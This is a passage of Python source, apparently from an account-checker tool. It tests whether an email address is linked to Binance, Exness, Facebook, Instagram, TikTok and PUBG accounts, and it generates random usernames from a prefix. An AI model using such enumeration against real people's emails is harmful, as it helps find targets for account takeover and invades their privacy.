        if Checkers.check_binance(email): linked.append("Binance")
        if Checkers.check_exness(email): linked.append("Exness")
        if Checkers.check_facebook(email): linked.append("Facebook")
        if Checkers.check_instagram(email): linked.append("Instagram")
        if Checkers.check_tiktok(email): linked.append("TikTok")
        if Checkers.check_pubg(email): linked.append("PUBG")
        return linked

class Generator:
    @staticmethod
    def create_user(prefix, length):
        chars = string.ascii_lowercase + string.digits
        if not length or length == 0: length = random.randint(7, 10)
        if not prefix: return ''.join(random.choice(chars) for _ in range(length))
        if len(prefix) >= length: return prefix
        needed = length - len(prefix)
        return prefix + ''.join(random.choice(chars) for _ in range(needed))

